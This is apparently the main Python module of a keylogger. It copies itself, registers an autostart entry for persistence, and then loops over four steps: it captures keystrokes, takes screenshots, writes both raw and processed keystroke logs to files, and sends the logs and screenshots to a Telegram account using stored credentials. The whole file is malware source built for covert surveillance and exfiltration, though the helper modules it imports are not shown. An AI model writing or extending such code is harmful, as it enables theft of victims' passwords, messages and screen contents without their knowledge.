from key_listener import KeyListener
from keylogger_utils import duplicate_script, create_autostart_entry, take_screenshot, handle_keyboard_interrupt
from log_utils import process_keys, format_message, write_to_log
from telegram_utils import load_credentials_telegram_from_script, send_info_telegram, send_image_telegram
from constants import TIME_OUT, LOG_FILE, LOG_FILE_2

# --------------------- MAIN --------------------- #

def main():
    key_listener = KeyListener()
    duplicate_script()
    create_autostart_entry()
    try:
        while True:
            # Capture typed keys and process them
            typed_keys = key_listener.read_keys(TIME_OUT)
            processed_keys = process_keys(typed_keys)
            message = format_message(typed_keys)
            processed_message = format_message(processed_keys)

            # Take screnshot and save it as a PNG file
            screenshot = take_screenshot()

            # Write the message to the log file
            write_to_log(message, LOG_FILE)
            write_to_log(processed_message, LOG_FILE_2)

            credentials = load_credentials_telegram_from_script()

            # Load credentials a pass to send logs through Telegram
            send_info_telegram(**credentials, message='RAW KEYLOGGER LOG\n\n' + message)
            send_info_telegram(**credentials, message='PROCESSED KEYLOGGER LOG\n\n' + processed_message)
            send_image_telegram(**credentials, image=screenshot)
    except KeyboardInterrupt:
        handle_keyboard_interrupt(key_listener)

if __name__ == "__main__":
    main()
